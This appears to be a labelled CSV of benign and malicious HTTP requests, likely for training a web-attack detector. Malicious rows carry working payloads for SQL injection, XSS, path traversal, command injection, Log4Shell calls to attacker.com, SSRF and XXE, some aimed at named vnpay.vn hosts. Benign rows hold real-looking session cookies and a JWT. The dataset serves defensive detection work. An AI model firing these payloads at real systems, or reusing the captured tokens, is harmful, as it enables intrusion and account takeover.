method,path,query,headers,body,ua,label
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,Nikto/2.1.6,1
GET,/PolicyMgmt/policyDetailsCard.do,poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E,"Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",1
PUT,/api/v1/user/settings,,Authorization: Bearer token123,,,0
GET,/,,Authorization: Bearer token123; Payload: id=1; SELECT pg_sleep(5)--,,,1
GET,/dashboard,view=summary&time=30d,Content-Type: application/json,,,0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,Authorization: Bearer token123; Payload: ' or '1'='1,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/admin,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
GET,/,,"Content-Type: application/json; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/favicon.ico,,,,,0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/p/tineco-chinh-hang,_rsc=7gfid,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: _ga=GA1.1.1731994210.1769673829; _gcl_au=1.1.933310129.1769673830; _tt_enable_cookie=1; _ttp=01KG4CFCV7R56Q4AFX37ZW8FWB_.tt.1; _fbp=fb.1.1769673831903.42978149522517950; _ga_1XRVJ9DDS6=GS2.1.s1770910631$o4$g1$t1770910959$j40$l0$h0; ttcsid_CQQA2PJC77U11VCBE7G0=1770910634382::BscanFBkWNWcMBR12QDW.4.1770910960711.1; ttcsid_CQNEHUJC77UD2I8MDM90=1770910634370::bb4MoLXrsk5z7XNJP-LJ.4.1770910960761.1; ttcsid=1770910634375::wISpMY-fp_GiqfLr7DRV.4.1770910960761.0; Host: agri-v2.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1004%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22VBA%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(navigation)%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22auth%2Fvnpay%2Flogin%22%2C%22oc%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%3F%7B%5C%22data%5C%22%3A%5C%22OltZJE7ZaPSLmXQJ5%2FpwgCMm%2FkvonsTD81qZJIfd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvs0c%2F9tUk9aZOxE3koZFMryS6MuYuOlmCWzObilSrHjqRFLYUW52JPgi%2Bg8Jp%2B71QjDuQtoB5voYPJa5Xue%2BcCKMeY9vmTX%2BnGXp6XhTnWQVAKjSVEooOaHX%2FNDo9hnCsrtGadir8DTC5MXybOi9OpwBLdY%2BAQb78ylccfMUVyzLdIKc48%2FPuKTwvlnLElF8NXRmqzIa1fKuV0%3D%5C%22%2C%5C%22signature%5C%22%3A%5C%2272e71b19f55dea9d615b0bc5f31e3f7e%5C%22%7D%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /auth/vnpay/login; Referer: https://agri-v2.vnshop.vn/auth/vnpay/login?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2FkvonsTD81qZJIfd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvs0c%2F9tUk9aZOxE3koZFMryS6MuYuOlmCWzObilSrHjqRFLYUW52JPgi%2Bg8Jp%2B71QjDuQtoB5voYPJa5Xue%2BcCKMeY9vmTX%2BnGXp6XhTnWQVAKjSVEooOaHX%2FNDo9hnCsrtGadir8DTC5MXybOi9OpwBLdY%2BAQb78ylccfMUVyzLdIKc48%2FPuKTwvlnLElF8NXRmqzIa1fKuV0%3D&signature=72e71b19f55dea9d615b0bc5f31e3f7e; Rsc: 1; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 14; CPH2387 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.111 Mobile Safari/537.36; X-Requested-With: com.vnpay.Agribank3g",,"Mozilla/5.0 (Linux; Android 14; CPH2387 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.111 Mobile Safari/537.36",0
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Content-Type: application/json; Payload: id=1; DROP TABLE users--,,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/favicon.ico,,,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/secure/ConfigurePortalPages!default.jspa,view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/604.1.28 (KHTML, like Gecko) Version/9.1.2 Safari/604.1.28",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/604.1.28 (KHTML, like Gecko) Version/9.1.2 Safari/604.1.28",1
POST,/checkout,,Host: example.com; Accept: */*,username=user60&password=pass910,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/,,Authorization: Bearer token123,"{""name"": ""__import__('os').system('id')""}",,1
PUT,/search,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/index.php,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <video><source onerror=""alert(1)"">",,,1
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/index.php,lvl=author_see&id=42691%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",,"Mozilla/5.0 (Windows; U; Windows NT 5.1; de) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",1
GET,/stores/find,zip=10001&distance=10,Content-Type: application/json,,,0
GET,/api/v1/map/data,lat=21.0285&lng=105.8542&zoom=15,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/index.php,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: Content-Length: 4\r\n\r\n1234",,,1
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/static/css/style.css,,Authorization: Bearer token123,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ${jndi:ldap://attacker.com/a}",,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,"Content-Type: application/json; Payload: <iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/products/nuoc-hoa-nu-mcm-ultra-eau-de-parfum-50ml-rosa-ID112582,sku-route-history=searchPage&_rsc=er4wc,"Accept: */*; Accept-Encoding: gzip, deflate, br; Accept-Language: vi-VN,vi;q=0.9; Connection: keep-alive; Cookie: _ga_1XRVJ9DDS6=GS2.1.s1770872925$o1$g1$t1770873773$j37$l0$h0; ttcsid=1770872926357::FVMbDFxF0yBsD7dafmWX.1.1770873773473.0; ttcsid_CQNEHUJC77UD2I8MDM90=1770872926356::Z64WqIPabE0M7y5IPWaE.1.1770873773473.1; _fbp=fb.1.1770872926795.159479462483982881; ttcsid_CQQA2PJC77U11VCBE7G0=1770872926357::gO98DLNf68mR8sT2bFqx.1.1770873772398.1; _ga=GA1.1.483329597.1770872926; _tt_enable_cookie=1; _ttp=01KH840W4FN4AC4VN8B7PK9A1A_.tt.1; _gcl_au=1.1.834359135.1770872926; Host: bidvmb.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1005%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22970418%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22landing%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22valentine-uu-dai-gap-doi%22%2C%22c%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /landing/valentine-uu-dai-gap-doi; Referer: https://bidvmb.vnshop.vn/landing/valentine-uu-dai-gap-doi; Rsc: 1; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",0
DELETE,/index.php,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
POST,/index.php,,Host: example.com; Accept: */*,input=admin'--,Nikto/2.1.6,1
GET,/api/v1/dashboard/widgets/sales-chart/data,,Content-Type: application/json,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: java\tscript:alert(1)",,,1
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
POST,/api/v1/posts/55/comments,,Content-Type: application/json,,,0
GET,/,,"Authorization: Bearer token123; Payload: <svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: http://127.0.0.1:22",,,1
POST,/register,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/cart/add,product_id=99,Content-Type: application/json,,,0
GET,/index.php,option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0,1
POST,/chat/init,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/admin,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
POST,/api/v1/orders,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/api/v1/users,q=&& whoami,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,Authorization: Bearer token123; Payload: http://169.254.169.254/latest/meta-data/,,,1
GET,/favicon.ico,,,,,0
GET,/index.php,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,Nmap Scripting Engine,1
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"Authorization: Bearer token123; Payload: <svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,"Authorization: Bearer token123; Payload: <iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
POST,/api/v1/documents,,Content-Type: application/json,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: %0d%0a* CAPABILITY",,,1
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/search,q=' OR 'x'='x,Host: example.com; Accept: */*,,curl/7.68.0,1
POST,/,,Authorization: Bearer token123,[Binary Frame] 0x89 (Ping),,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/index.php,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nikto/2.1.6,1
GET,/auth/verify-email,code=v987654321,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/,,Authorization: Bearer token123,[Binary Frame] 0x89 (Ping),,0
PUT,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
PUT,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,sqlmap/1.5.2,1
GET,/,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,1
POST,/webhooks/stripe,,Content-Type: application/json,,,0
POST,/legal/tos/accept,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/,,Content-Type: application/json,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,/user/orders,status=shipped&from=2025-01-01,Content-Type: application/json,,,0
DELETE,/admin,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,sqlmap/1.5.2,1
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/admin,,Host: example.com; Accept: */*,input=&& whoami,sqlmap/1.5.2,1
GET,/images/logo-banks/agribank.svg,,"Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5; Accept-Encoding: gzip, deflate, br; Accept-Language: en-US,en;q=0.9; Connection: keep-alive; Cookie: session_token=eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA1MjI5Njc2ODgiLCJzY2hhbm5lbCI6IldlYl8wMDEiLCJ1c2VyLWlkIjoiN2M3MTBiMmEtY2RkNi00ZTc5LTljOTUtNDBkZmZjODM5M2VhIiwidXNlcm5hbWUiOiJXZWJfMDAxQDA1MjI5Njc2ODgiLCJzdWIiOiJXZWJfMDAxQDA1MjI5Njc2ODgiLCJpYXQiOjE3NzA4MDAwODMsImV4cCI6MTc3MTQwNDg4M30.0R6qiNB7PjnVltqBETvx9-AkaSnUG6qt4Q9k1v-pf_g; Host: web.poc.vnshop.cloud; If-Modified-Since: Tue, 10 Feb 2026 09:18:27 GMT; If-None-Match: W/""2d64-19c46d851be""; Priority: u=4, i; Referer: https://web.poc.vnshop.cloud/payment/80136f53-6ef1-4d58-8dad-2c02722d9c31?vnp_Amount=270300000&vnp_BankCode=NCB&vnp_BankTranNo=VNP15426732&vnp_CardType=ATM&vnp_OrderInfo=Thanh+toan+cho+ma+giao+dich+260211PAVXKJDRE_31E5.+So+tien%3A+270300000+VND&vnp_PayDate=20260211174332&vnp_ResponseCode=00&vnp_TmnCode=VNISCTT3&vnp_TransactionNo=15426732&vnp_TransactionStatus=00&vnp_TxnRef=260211PAVXKJDRE_31E5&vnp_SecureHash=47b4aba939ba137da671b4446af8fca9ffb5647ec0c4475f62f844fd2a5910c20f4fffa8c46703cb000d34f8faebe8344e68d319f605e84efdab68e35523dfbb; Sec-Fetch-Dest: image; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; Te: trailers; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/search,q=1+1=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/index.php,mod=textviewer&src=file:///etc/passwd,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20,,Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20,1
GET,/,,Content-Type: application/json,,,0
GET,/api/v1/products,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,url=http://malicious.com,Authorization: Bearer token123,,,1
GET,/stores/find,zip=10001&distance=10,Content-Type: application/json,,,0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/index.php,option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",1
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,Authorization: Bearer token123; Payload: ; /bin/c?t /e*c/p?sswd,,,1
POST,/public/index.php/home/index/bind_follow/,"publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--++","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Content-Length: 0; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 X-Middleton/1",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 X-Middleton/1",1
GET,/,,Content-Type: application/json; Payload: admin*)(| (password=*)),,,1
GET,/,,Authorization: Bearer token123; Payload: ..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/newsletter/unsubscribe,token=abc123def456,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/search,q=1+1=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,id=1&id=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/search,q=O'Reilly,Authorization: Bearer token123,,,0
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/htdocs/index.php/cmd.php,cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/service/0/test.oast.me,,Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0,1
GET,/admin,q=admin'--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: `uname -a`",,,1
POST,/,,Content-Type: application/json,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
POST,/,,Content-Type: application/json,{{7*7}} or {{config.items()}},,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: \x81\xfe\x00\x00... (illegal length)",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,Content-Type: application/json; Payload: <img src=x onerror=alert(1)>,,,1
GET,/,,Content-Type: application/json; Payload: ac ed 00 05 73 72 00 12 ...,,,1
POST,/,,Host: example.com; Accept: */*,username=user465&password=pass303,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user484&password=pass192,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user847&password=pass426,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
